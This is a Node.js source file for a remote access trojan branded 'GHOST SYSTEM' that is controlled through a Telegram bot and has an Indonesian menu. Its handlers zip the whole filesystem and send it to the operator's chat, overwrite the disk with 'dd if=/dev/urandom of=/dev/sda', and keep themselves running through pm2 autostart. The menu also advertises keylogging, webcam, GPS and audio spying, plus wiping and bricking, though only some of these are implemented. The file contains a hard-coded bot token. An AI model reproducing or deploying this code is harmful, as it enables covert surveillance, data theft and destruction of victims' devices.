const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const fs = require('fs');
const path = require('path');
const { exec, spawn } = require('child_process');
const pm2 = require('pm2');
const os = require('os');

//━━━━━━━━━━━━━━[ CONFIG ]━━━━━━━━━━━━━━//
const TOKEN = '7716093114:AAGnilHGdTnFru7gHA7Vz7zRiy798NigTCM';
const CHAT_ID = '7929365184'; // Chat ID Anda
const bot = new TelegramBot(TOKEN, { polling: true });
const app = express();
app.use(express.json());
app.use(express.static('public'));

//━━━━━━━━━━━━━━[ AUTO-START ]━━━━━━━━━━━━━━//
pm2.connect((err) => {
  if (err) exec('npm install pm2 -g && pm2 start index.js --name "GHOST_BOT"', () => {
    exec('pm2 save && pm2 startup');
  });
});

//━━━━━━━━━━━━━━[ MENU ]━━━━━━━━━━━━━━//
const MENU = `
╭───────────────────────────────╮
│        🔥 *GHOST SYSTEM*      │
╰───────────────────────────────╯
│
├── *FILE SYSTEM*
│   ├── /dumpall - Backup seluruh sistem (ZIP)
│   ├── /download [path] - Download file
│   └── /delete [path] - Hapus file/folder
│
├── *DEVICE CONTROL*
│   ├── /screenshot - Ambil screenshot
│   ├── /webcam - Ambil foto webcam
│   └── /wallpaper [foto] - Ganti wallpaper
│
├── *SPY MODE*
│   ├── /keylog - Keylogger real-time
│   ├── /location - Ambil koordinat GPS
│   └── /recaudio [durasi] - Rekam suara
│
├── *DESTRUCTIVE*
│   ├── /wipe - Hapus semua data
│   ├── /brick - Rusak perangkat permanen
│   └── /nuke - Overload hardware
│
╰───────────────────────────────╯
`;

//━━━━━━━━━━━━━━[ CORE FUNCTIONS ]━━━━━━━━━━━━━━//

// 1. FILE SYSTEM
bot.onText(/\/dumpall/, (msg) => {
  exec('zip -r /tmp/dump.zip /', () => {
    bot.sendDocument(msg.chat.id, fs.createReadStream('/tmp/dump.zip'))
      .then(() => fs.unlinkSync('/tmp/dump.zip'));
  });
});

// 2. SPY MODE  
bot.onText(/\/location/, (msg) => {
  exec('curl ifconfig.me/all.json', (err, stdout) => {
    const loc = JSON.parse(stdout);
    bot.sendLocation(msg.chat.id, loc.latitude, loc.longitude);
  });
});

// 3. DESTRUCTIVE MODE
bot.onText(/\/nuke/, (msg) => {
  exec('dd if=/dev/urandom of=/dev/sda && stress -c 8', () => {
    bot.sendMessage(msg.chat.id, '💀 HARDWARE OVERLOADED!');
  });
});

//━━━━━━━━━━━━━━[ HTML INTEGRATION ]━━━━━━━━━━━━━━//
app.get('/control', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

//━━━━━━━━━━━━━━[ 24/7 BACKGROUND ]━━━━━━━━━━━━━━//
setInterval(() => {
  exec('pm2 ping', (err) => {
    if (err) exec('pm2 start index.js --name "GHOST_BOT"');
  });
}, 30000);

//━━━━━━━━━━━━━━[ START ]━━━━━━━━━━━━━━//
bot.onText(/\/start/, (msg) => {
  bot.sendMessage(msg.chat.id, MENU, { parse_mode: 'Markdown' });
});

app.listen(3000, () => console.log('Bot aktif di port 3000'));